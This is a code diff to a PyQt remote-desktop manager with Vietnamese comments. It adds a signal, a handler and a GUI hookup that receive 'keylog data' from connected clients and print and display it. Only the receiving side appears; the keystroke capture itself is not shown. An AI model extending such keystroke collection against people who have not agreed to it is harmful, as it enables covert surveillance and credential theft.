@@ -31,6 +31,7 @@ class Manager(QObject):
     error_received = pyqtSignal(str)
     disconnected_from_server = pyqtSignal()
     cursor_pdu_received = pyqtSignal(object)
+    input_pdu_received = pyqtSignal(object)  # Keylog data
 
     def __init__(self, host: str, port: int, manager_id: str = "manager1", username: str = None, password: str = None):
         super().__init__()
@@ -52,6 +53,7 @@ class Manager(QObject):
         self.app.on_file_pdu = self._on_file_pdu
         self.app.on_control_pdu = self._on_control_pdu
         self.app.on_cursor_pdu = self._on_cursor_pdu
+        self.app.on_input_pdu = self._on_input_pdu
 
     def start(self):
         if not os.path.exists(CA_FILE):
@@ -135,6 +137,13 @@ class Manager(QObject):
         
     def _on_control_pdu(self, pdu: dict):
         print(f"[Manager] Control PDU từ client: {pdu.get('message')}")
+    
+    def _on_input_pdu(self, pdu: dict):
+        """Xử lý INPUT PDU (keylog data) từ client"""
+        if not self.current_session_client_id:
+            return
+        print(f"[Manager] INPUT PDU từ client: {pdu.get('message')}")
+        self.input_pdu_received.emit(pdu)
 
     # --- Slots (Hàm được gọi từ GUI) (Giữ nguyên) ---
 
@@ -248,6 +257,7 @@ if __name__ == "__main__":
     manager_logic.video_pdu_received.connect(window.update_video_frame)
     manager_logic.cursor_pdu_received.connect(window.update_cursor_pos)
     manager_logic.error_received.connect(window.show_error)
+    manager_logic.input_pdu_received.connect(window.display_keylog)
     
     window.connect_requested.connect(manager_logic.gui_connect_to_client)
     window.disconnect_requested.connect(manager_logic.gui_disconnect_session)
